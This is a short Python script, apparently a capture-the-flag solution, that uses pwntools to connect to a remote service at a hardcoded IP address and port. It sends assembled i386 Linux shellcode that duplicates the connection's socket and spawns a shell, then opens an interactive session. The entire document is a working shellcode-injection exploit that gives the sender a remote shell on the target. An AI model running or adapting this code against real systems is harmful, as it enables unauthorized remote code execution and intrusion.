import pwn

conn = pwn.remote('104.196.61.88', 2831)

preamble = pwn.asm('mov eax, [esp+4]')
shellcode = pwn.asm(pwn.shellcraft.i386.linux.dupsh(sock='eax'))

conn.send(preamble + shellcode)

conn.interactive()